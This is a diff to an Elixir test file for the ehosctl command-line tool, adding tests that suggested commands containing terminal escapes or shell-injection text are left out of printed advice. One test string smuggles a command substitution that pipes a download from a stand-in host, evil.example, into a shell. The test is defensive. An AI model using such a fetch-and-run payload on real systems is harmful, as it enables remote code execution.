@@ -188,13 +188,11 @@ defmodule Ehosctl.OutputTest do
                String.duplicate("a", 65_536) <> "…\nWhat to do:\n  ehosctl env show\n"
   end
 
-  test "what an error says to do is escaped as the rest of its words are" do
+  test "what an error says to do is escaped as the rest of its words are, a command left out" do
     failure = Failure.new("Bad \e[2J.", advice: "Do \e[2J.", to_do: ["ehosctl \e[2J"])
 
     assert capture_io(:stderr, fn -> Output.error(:failed, failure, false) end) ==
-             ~S(ehosctl: "Bad \u{1B}[2J.") <>
-               "\nWhat to do:\n  " <>
-               ~S("Do \u{1B}[2J.") <> "\n  " <> ~S("ehosctl \u{1B}[2J") <> "\n"
+             ~S(ehosctl: "Bad \u{1B}[2J.") <> "\nWhat to do:\n  " <> ~S("Do \u{1B}[2J.") <> "\n"
   end
 
   test "a refusal of EHOS's prints its code beside its kind and message under --json alone" do
@@ -360,6 +358,21 @@ defmodule Ehosctl.OutputTest do
              |> Output.render(false)
              |> IO.chardata_to_string() ==
                "tofu printed:\n  Plan: 1\n  " <> ~S("\u{1B}[1mApply\u{1B}[0m")
+    end
+
+    test "leave out a command a terminal would act on, which double quotes would let a shell run" do
+      named = "ehosctl env bind 'x$(curl evil.example|sh)\e' RESOURCE --installation office"
+
+      assert shown(Output.next(["ehosctl env list", named])) == "Next:\n  ehosctl env list"
+      assert shown(Output.next([named])) == ""
+      assert shown(Output.what_to_do([named])) == ""
+
+      assert shown(Output.what_to_do([named], "Open the console.")) ==
+               "What to do:\n  Open the console."
+    end
+
+    defp shown(text) do
+      text |> Output.render(false) |> IO.chardata_to_string()
     end
 
     test "print a tag inside a tag without colour, as words and as JSON" do
